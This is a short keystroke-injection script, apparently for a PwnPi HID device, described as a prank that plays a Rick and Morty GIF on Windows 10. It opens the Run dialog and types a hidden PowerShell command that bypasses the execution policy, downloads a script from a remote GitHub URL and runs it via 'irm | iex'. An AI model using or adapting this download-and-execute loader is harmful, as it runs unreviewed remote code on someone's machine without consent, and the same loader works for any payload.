// Title: beigeworm's GIF Player.
// Author: @beigeworm
// Description: This script changes downlaods a rick and morty GIF and plays it in a GUI window.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/GIF-Player/main.ps1 | iex");
delay(500);
press("ENTER");